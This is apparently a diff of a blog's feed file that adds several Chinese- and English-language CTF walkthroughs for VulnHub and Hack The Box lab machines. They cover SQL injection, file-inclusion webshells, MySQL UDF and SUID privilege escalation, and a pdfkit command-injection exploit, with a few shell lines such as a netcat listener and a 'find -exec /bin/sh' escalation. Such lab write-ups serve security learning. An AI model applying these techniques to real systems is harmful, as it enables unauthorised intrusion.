+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulnhub_PwnOS2.0</title>
+    <link href="/2023/04/26/vulnhub-PwnOS2-0/"/>
+    <url>/2023/04/26/vulnhub-PwnOS2-0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="PwnOS2-0"><a href="#PwnOS2-0" class="headerlink" title="PwnOS2.0"></a>PwnOS2.0</h1><p>首先nmap扫描端口，发现22，25，80，110等开放：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321135938360.png" alt="image-20230321135938360"></p><p>nikto扫一下80的http服务：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140053612.png" alt="image-20230321140053612"></p><p>发现了一些敏感目录。</p><p>info目录为phpinfo:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140123549.png" alt="image-20230321140123549"></p><p>includes:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140140442.png" alt="image-20230321140140442"></p><p>login.php为登录页面：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140320230.png" alt="image-20230321140320230"></p><p>register.php为注册页面：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140330516.png" alt="image-20230321140330516"></p><p>注册用户<a href="mailto:&#x61;&#97;&#97;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#x61;&#97;&#97;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a>，未发现有用信息。</p><p>接下来考虑通过login.php来getshell，在email字段输入单引号，报错：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140613604.png" alt="image-20230321140613604"></p><p>明显存在sql注入，并且报错提示数据库为mysql。</p><p>burp抓包直接跑sqlmap，加上–dbms mysql参数：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140853513.png" alt="image-20230321140853513"></p><p>存在注入，–dump，查看user&#x2F;pass：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141528736.png" alt="image-20230321141528736"></p><p><a href="mailto:&#97;&#97;&#x61;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;">&#97;&#97;&#x61;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;</a>是注册的测试账号，尝试使用<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#x6f;&#109;</a>账号登录&#x2F;</p><p>密码为md5，解开后为killerbeesareflying，登录：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141719166.png" alt="image-20230321141719166"></p><p>登录成功，但是没有可用信息，回到sqlmap，直接–os-shell:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141951074.png" alt="image-20230321141951074"></p><p>成功拿到shell，为www-data权限，但是此处的shell无法弹到kali。</p><p>在kali上寻找php马，传到靶机上：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142452841.png" alt="image-20230321142452841"></p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142229760.png" alt="image-20230321142229760"></p><p>本地开启监听，成功连上靶机：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142252180.png" alt="image-20230321142252180"></p><p>在当前目录下发现mysqli_connect.php文件，并发现密码root&#x2F;goodday:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142626934.png" alt="image-20230321142626934"></p><p>尝试登录mysql，失败，登录ssh同样失败。</p><p>回到上级目录，也存在mysqli_connect.php文件，查看发现另一组账号root&#x2F;root@ISIntS:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142650060.png" alt="image-20230321142650060"></p><p>ssh登录，成功拿到root权限：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142837619.png" alt="image-20230321142837619"></p><p>同时该密码可以登录mysql，因此尝试udf提权。</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155456474.png" alt="image-20230321155456474"></p><p>首先查看secure_file_priv，如果值为空，则可以提权：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155715082.png" alt="image-20230321155715082"></p><p>接下来查看compile选项：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155755619.png" alt="image-20230321155755619"></p><p>linux，64位。</p><p>最后查看plugin路径，如果没有需要自行创建，此处存在：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155836405.png" alt="image-20230321155836405"></p><p>使用sqlmap直接将udf.so文件传到plugin目录：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321143053212.png" alt="image-20230321143053212"></p><p>此处的so文件使用的是msf自带的，如果使用sqlmap中的，需要先进行解码。</p><p>msf中路径为：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321160832973.png" alt="image-20230321160832973"></p><p>分别对应了linux和windows中的32&#x2F;64位文件，此处使用的是lib_mysqludf_sys_64.so。</p><p>上传之后，默认会多出一个sys_eval方法，但是不会回显，再手动添加一次，returns string：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321153548843.png" alt="image-20230321153548843"></p><p>此时查询方法，存在sys_eval，执行whoami，是root权限，提权成功。</p><p>为了后续操作，给find加上suid：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321143316978.png" alt="image-20230321143316978"></p><p>从www-data权限，使用suid提权，<code>touch 1.txt, find 1.txt -exec &#39;/bin/sh&#39; \;</code>，成功提权到root。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulnhub_Pwnlab</title>
+    <link href="/2023/04/26/vulnhub-Pwnlab/"/>
+    <url>/2023/04/26/vulnhub-Pwnlab/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Pwnlab"><a href="#Pwnlab" class="headerlink" title="Pwnlab"></a>Pwnlab</h1><p>nmap扫端口&amp;服务：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323110917405.png" alt="image-20230323110917405"></p><p>主要是rpc和80端口的http服务。</p><p>使用rpcinfo进行探测：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323111530034.png" alt="image-20230323111530034"></p><p>无有效信息。</p><p>dirsearch爆破后台敏感目录：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323111545504.png" alt="image-20230323111545504"></p><p>首先直接访问80端口：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134559022.png" alt="image-20230323134559022"></p><p>访问&#x2F;upload:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134621886.png" alt="image-20230323134621886"></p><p>很明显为上传的文件。</p><p>接着访问&#x2F;upload.php:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134633666.png" alt="image-20230323134633666"></p><p>提示需要登录。</p><p>接下来访问login页面，出现登录框：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134652498.png" alt="image-20230323134652498"></p><p>burp抓包：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135618265.png" alt="image-20230323135618265"></p><p>输入单引号，无变化，保存报文内容跑sqlmap，无果。</p><p>对&#x2F;login.php进行同样的尝试：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135734466.png" alt="image-20230323135734466"></p><p>同样失败。</p><p>尝试对upload发送options请求：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135830977.png" alt="image-20230323135830977"></p><p>不允许put方法，无法直接写马。</p><p>仔细观察流量，发现登录页面的url为&#x2F;?page&#x3D;login，考虑存在文件包含漏洞。</p><p>直接尝试&#x2F;etc&#x2F;passwd：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323140414126.png" alt="image-20230323140414126"></p><p>无回显。</p><p>尝试伪协议读取源码。目前url为<a href="http://192.168.59.30/index.php?page=login%EF%BC%8C%E8%80%8Cconfig.php%E4%B8%BAhttp://192.168.59.30/config.php%EF%BC%8C%E5%9B%A0%E6%AD%A4%E9%9C%80%E8%A6%81%E8%BF%94%E5%9B%9E%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%EF%BC%9A">http://192.168.59.30/index.php?page=login，而config.php为http://192.168.59.30/config.php，因此需要返回一级目录：</a></p><p><img src="/2023/04/27/file-upload/ab/image-20230323140649744.png" alt="image-20230323140649744"></p><p>成功读取，base64解密：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323140713926.png" alt="image-20230323140713926"></p><p>得到数据库的账号密码，连接数据库：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323141140279.png" alt="image-20230323141140279"></p><p>base64解密后，得到kent，mike和kane3个用户的密码。ssh连接失败，端口未开放：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323141906558.png" alt="image-20230323141906558"></p><p>无法直接ssh，因此登录尝试文件上传：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323142523888.png" alt="image-20230323142523888"></p><p>上传php马，提示不允许的后缀，只能上传图片。</p><p>首先考虑apache多后缀解析漏洞，上传pwnlab.php.jpg:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144220196.png" alt="image-20230323144220196"></p><p>未绕过。</p><p>接下来考虑上传图片马，再配合解析漏洞或者文件包含漏洞将其作为php文件解析。</p><p>&#x2F;index.php?page&#x3D;xxx该处存在文件包含漏洞，读取index.php源码：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144332964.png" alt="image-20230323144332964"></p><p>base64 decode：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144356432.png" alt="image-20230323144356432"></p><p>这里如果cookie中lang参数又存在文件包含。</p><p>先制作图片马，echo -e代表允许反斜杠解析，GIF89a为gif文件的文件头：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144857630.png" alt="image-20230323144857630"></p><p>上传成功：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145006507.png" alt="image-20230323145006507"></p><p>在cookie中输入gif文件的url，将php马包含，kali开启监听：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145136383.png" alt="image-20230323145136383"></p><p>成功获取shell。</p><p>当前为www-data权限，通过前面获取的账号密码，可以登录到kent和kane账户。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145609941.png" alt="image-20230323145609941"></p><p>kent目录下无文件，切换到kane，发现msgmike。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323150733143.png" alt="image-20230323150733143"></p><p>msgmike为elf可执行文件，并且有suid，strings查看发现存在命令cat &#x2F;home&#x2F;mike&#x2F;msg.txt。</p><p>直接运行：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323150837248.png" alt="image-20230323150837248"></p><p>提示无cat文件。因此直接新建cat文件，内容为&#x2F;bin&#x2F;bash，并且将$PATH参数修改，默认先使用我们新建的cat：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323151050920.png" alt="image-20230323151050920"></p><p>成功提权到mike，此时记得将$PATH恢复。</p><p>进入&#x2F;home&#x2F;mike目录下，存在msg2root文件，通过命名判断，需要通过该文件从mike提权到root权限。</p><p>将msg2root放入ida：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152452183.png" alt="image-20230323152452183"></p><p>发现system函数。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152547004.png" alt="image-20230323152547004"></p><p>并且msg2root为root权限，因此考虑直接使用msg2root执行&#x2F;bin&#x2F;bash命令拿到root shell。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152844893.png" alt="image-20230323152844893"></p><p>这里类似于远程代码执行漏洞，通过；截断即可执行命令，&#x2F;bin&#x2F;bash失败，尝试&#x2F;bin&#x2F;sh:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152925140.png" alt="image-20230323152925140"></p><p>成功。经过尝试&amp;等符号同样可行。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulnhub_Mr-robot</title>
+    <link href="/2023/04/26/vulnhub-Mr-robot/"/>
+    <url>/2023/04/26/vulnhub-Mr-robot/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Mr-robot"><a href="#Mr-robot" class="headerlink" title="Mr-robot"></a>Mr-robot</h1><p>nmap扫描，开放了80和443端口：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322143637974.png" alt="image-20230322143637974"></p><p>浏览器访问：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322143728895.png" alt="image-20230322143728895"></p><p>后台目录爆破：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145023429.png" alt="image-20230322145023429"></p><p>发现robots.txt，访问：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145306410.png" alt="image-20230322145306410"></p><p>发现两个文件,fsocity.dic，key-1-of-3.txt，分别查看：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145336763.png" alt="image-20230322145336763"></p><p>其中fsocity.dic是一个字典，有80万行，接着访问key：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145351085.png" alt="image-20230322145351085"></p><p>看似为md5值，md5解密失败，从名称判断应该是3个key中的第一个。</p><p>dirsearch还发现了wp-login等目录，判断该网站为word press。</p><p>结合dic字典，进行账号爆破。首先对字典进行去重：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145213115.png" alt="image-20230322145213115"></p><p>去重后保存到new文件，有1万多行数据。</p><p>首先从lostpassword页面爆破用户名：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150401225.png" alt="image-20230322150401225"></p><p>对结果进行关键字匹配，成功爆破出Elliot。</p><p>使用该用户名，继续爆破密码：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150604710.png" alt="image-20230322150604710"></p><p>爆破出密码ER28-0652。</p><p>登录后台：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150644787.png" alt="image-20230322150644787"></p><p>在appearance模块中可以编辑php文件，最简单的方法是修改404.php，将马复制到404.php，任意输入不存在的url，报错，连接成功：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151001633.png" alt="image-20230322151001633"></p><p>此时为daemon权限。</p><p>进入home，发现存在robot目录，发现password.raw-md5，解密后得到robot用户的密码，并且成功得到第二个key。</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151015498.png" alt="image-20230322151015498"></p><p>接下来继续提权到root，sudo -l无可用命令，上传检查脚本：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151033460.png" alt="image-20230322151033460"></p><p>发现nmap有suid：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151207435.png" alt="image-20230322151207435"></p><p>nmap –interactive进入交互模式，起shell：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151416138.png" alt="image-20230322151416138"></p><p>成功拿到root权限，得到第三个key。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulnhub_FristiLeaks_1.3</title>
+    <link href="/2023/04/26/vulnhub-FristiLeaks-1-3/"/>
+    <url>/2023/04/26/vulnhub-FristiLeaks-1-3/</url>
+    
+    <content type="html"><![CDATA[<h1 id="FristiLeaks-1-3"><a href="#FristiLeaks-1-3" class="headerlink" title="FristiLeaks_1.3"></a>FristiLeaks_1.3</h1><p>arp-scan获取目标ip 192.168.59.18：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307205944349.png" alt="image-20230307205944349"></p><p>masscan全端口扫描:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212119043.png" alt="image-20230307212119043"></p><p>nmap对开放端口进行服务探测：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212152487.png" alt="image-20230307212152487"></p><p>whatweb：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212239788.png" alt="image-20230307212239788"></p><p>dirsearch目录爆破：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212417837.png" alt="image-20230307212417837"></p><p>nikto扫描：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213101589.png" alt="image-20230307213101589"></p><p>综上，只开放了一个80端口，开启了apache服务，apache2.2.15+php5.3.3，linux操作系统，后台目录有&#x2F;cola,&#x2F;robots.txt,&#x2F;images,&#x2F;sisi,&#x2F;beer.</p><p>先访问web界面：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213538737.png" alt="image-20230307213538737"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213600829.png" alt="image-20230307213600829"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213610628.png" alt="image-20230307213610628"></p><p>查看源代码：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213726384.png" alt="image-20230307213726384"></p><p>均无有效信息。</p><p>接下来尝试寻找php+apache漏洞。</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213811701.png" alt="image-20230307213811701"></p><p>前两个版本均符合，尝试利用。</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213906097.png" alt="image-20230307213906097"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213932426.png" alt="image-20230307213932426"></p><p>404.无cgi页面。</p><p>第二个脚本利用结果同样如此：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214017727.png" alt="image-20230307214017727"></p><p>404 not found.</p><p>继续从web页面寻找突破，根据首页的图片，尝试访问&#x2F;fristi:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214232322.png" alt="image-20230307214232322"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214806121.png" alt="image-20230307214806121"></p><p>经过简单的手注之后，无果，直接sqlmap：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214431409.png" alt="image-20230307214431409"></p><p>不存在sql注入。</p><p>爆破弱口令同样失败。</p><p>查看源代码，发现提示：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214859613.png" alt="image-20230307214859613"></p><p>作者名为eezeepz，并且使用了base64加密图片，往下飞发现base64密文：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214950977.png" alt="image-20230307214950977"></p><p>base64解密，发现文件头PNG：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215107490.png" alt="image-20230307215107490"></p><p>保存为png查看：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215246674.png" alt="image-20230307215246674"></p><p>发现一串密码，keKkeKKeKKeKkEkkEk，登录：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215418880.png" alt="image-20230307215418880"></p><p>登录成功，来到文件上传页面。</p><p>上传正常jpg文件，成功：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215630815.png" alt="image-20230307215630815"></p><p>访问&#x2F;uploads&#x2F;conan.jpg:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215658986.png" alt="image-20230307215658986"></p><p>正常。</p><p>写马，改后缀：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220022189.png" alt="image-20230307220022189"></p><p>失败，校验了后缀名，只能为png,jpg,gif。</p><p>考虑到apache版本为2.2.15，存在多后缀解析漏洞，直接加后缀：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220110652.png" alt="image-20230307220110652"></p><p>成功，蚁剑连接：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220139843.png" alt="image-20230307220139843"></p><p>为低权限，apache，home目录下有3个用户，admin,eezeepz,fristigod:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220407606.png" alt="image-20230307220407606"></p><p>除了eezeepz目录，都没有权限访问，在eezeepz目录下发现notes.txt:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220524600.png" alt="image-20230307220524600"></p><p>可以发现如下信息：</p><p>作者jerry，即为&#x2F;home&#x2F;admin，该目录下有chmod,df,cat,echo,ps,grep,egrep等命令可以使用，在&#x2F;tmp&#x2F;目录下新建一个runthis文件，该文件里的内容会以admin的权限每分钟运行一次，结果保存在&#x2F;tmp&#x2F;cronresult中。</p><p>首先想到的是chmod命令，改变&#x2F;home&#x2F;admin权限：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307221710113.png" alt="image-20230307221710113"></p><p>此时已经能够访问&#x2F;admin目录。</p><p>查看文件内容：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307221828145.png" alt="image-20230307221828145"></p><p>从命名看出，cryptedpass.txt为加密后的密文，而cryptpass.py为加密脚本。</p><p>编写解密函数：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222312005.png" alt="image-20230307222312005"></p><p>解密得到明文：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222356135.png" alt="image-20230307222356135"></p><p>可能是某个用户的密码，尝试su：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222439699.png" alt="image-20230307222439699"></p><p>先tty：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222639878.png" alt="image-20230307222639878"></p><p>蚁剑的虚拟终端无法成功，先传shell到kali，再用python：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222841090.png" alt="image-20230307222841090"></p><p>成功拿到fristigod权限。</p><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223028627.png" alt="image-20230307223028627"></p><p>提示可以使用该 “doCom” 执行任何命令。</p><p>访问文件：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223554288.png" alt="image-20230307223554288"></p><p>为二进制文件。</p><p>有提示.&#x2F;program_name terminal_command.</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223705185.png" alt="image-20230307223705185"></p><p>来到同级目录，查看history文件，用法为sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom &lt;command&gt;</p><p>因此直接起新的终端：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223841372.png" alt="image-20230307223841372"></p><p>拿到root权限，获取flag。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>htb_precious</title>
+    <link href="/2023/04/26/htb-precious/"/>
+    <url>/2023/04/26/htb-precious/</url>
+    
+    <content type="html"><![CDATA[<h1 id="precious"><a href="#precious" class="headerlink" title="precious"></a>precious</h1><h2 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h2><p>use nmap to discover open-ports and services:</p><p><img src="/2023/04/27/file-upload/image-20230426093453128.png" alt="image-20230426093453128"></p><p>Now we focus on its http service on <strong>port 80</strong>.</p><p>Access it by firefox browser(remember to modify your &#x2F;etc&#x2F;hosts):</p><p><img src="/2023/04/27/file-upload/image-20230426093615323.png" alt="image-20230426093615323"></p><p>It seems that this website would help us convert web page to a pdf file. I tried <code>aaa</code> in the search bar:</p><p><img src="/2023/04/27/file-upload/image-20230426093935361.png" alt="image-20230426093935361"></p><p>I was reminded to provide a valid url. Naturally i think of starting a http-server on my kali and then entering my server address :</p><p><img src="/2023/04/27/file-upload/image-20230426094213706.png" alt="image-20230426094213706"></p><p>As excepted, a pdf was downloaded to my own machine. We can obviously find some familiar files by clicking it.</p><p>At this time all i can access is a <strong>pdf</strong> , as a result i use <code>exiftool</code> to analyse it.</p><p><img src="/2023/04/27/file-upload/image-20230426094838824.png" alt="image-20230426094838824"></p><p>What inspires me is <code>pdfkit v0.8.6</code>. I tried <code>searchsploit</code> subconsciously but found nothing:</p><p><img src="/2023/04/27/file-upload/image-20230426095134399.png" alt="image-20230426095134399"></p><p>Then i turned to google , finding a command injection vulnerability:</p><p><img src="/2023/04/27/file-upload/image-20230426095404721.png" alt="image-20230426095404721"></p><p>After trying several pocs, i found a python exp[<a href="https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765">nikn0laty&#x2F;PDFkit-CMD-Injection-CVE-2022-25765: Exploit for CVE-2022-25765 command injection in pdfkit &lt; 0.8.6 (github.com)</a>]:</p><p>step 1:</p><p>starting a python simple http-server:</p><p><img src="/2023/04/27/file-upload/image-20230426095817647.png" alt="image-20230426095817647"></p><p>step 2:</p><p>nc:</p><p><img src="/2023/04/27/file-upload/image-20230426095839251.png" alt="image-20230426095839251"></p><p>step 3:</p><p>python CVE-2022-25765.py -t target -a localhost -p localport:</p><p><img src="/2023/04/27/file-upload/image-20230426100735748.png" alt="image-20230426100735748"></p><h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><p>now we got a shell after exploit:</p><p><img src="/2023/04/27/file-upload/image-20230426100950158.png" alt="image-20230426100950158"></p><p>By following below steps , i finally access a fully interactive shell:</p><ol><li>open a bash terminal</li><li>nc -nlvp 4444</li><li>ctrl+z to background the job</li><li>stty -echo raw</li><li>fg</li></ol><p><img src="/2023/04/27/file-upload/image-20230426101437784.png" alt="image-20230426101437784"></p><p>I found a secret directory in home path after looking around:</p><p><img src="/2023/04/27/file-upload/image-20230426101649976.png" alt="image-20230426101649976"></p><p><code>su henry</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426101922560.png" alt="image-20230426101922560"></p><p><code>user.txt</code> lies in <code>/home/henry</code> .</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>The last step is privilege escalation.</p><p>At first , i tried the most simple but effective way:</p><p><img src="/2023/04/27/file-upload/image-20230426102257184.png" alt="image-20230426102257184"></p><p>It appears that henry can run the file update_depencies.rb as root. Use cat to take a look at the file:</p><p><img src="/2023/04/27/file-upload/image-20230426102404182.png" alt="image-20230426102404182"></p><p>I’m stuck with <code>YAML.load</code> , it appears to be vulnerable to a deserialization attack. </p><p>Notice that the rb load a file named <strong>dependencies.yml</strong>. I download malicious yml from google to vefity the vul.</p><p><img src="/2023/04/27/file-upload/image-20230426102947150.png" alt="image-20230426102947150"></p><p><code>sudo /usr/bin/ruby /opt/update_dependencies.rb</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426103016168.png" alt="image-20230426103016168"></p><p>It works!</p><p>Try to add suid to &#x2F;bin&#x2F;bash:</p><p><img src="/2023/04/27/file-upload/image-20230426103128047.png" alt="image-20230426103128047"></p><p>exploit:</p><p><img src="/2023/04/27/file-upload/image-20230426103144435.png" alt="image-20230426103144435"></p><p><code>/bin/bash -p</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426103206671.png" alt="image-20230426103206671"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>htb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>walkthrough</tag>
+      
+      <tag>htb</tag>
       
     </tags>
     
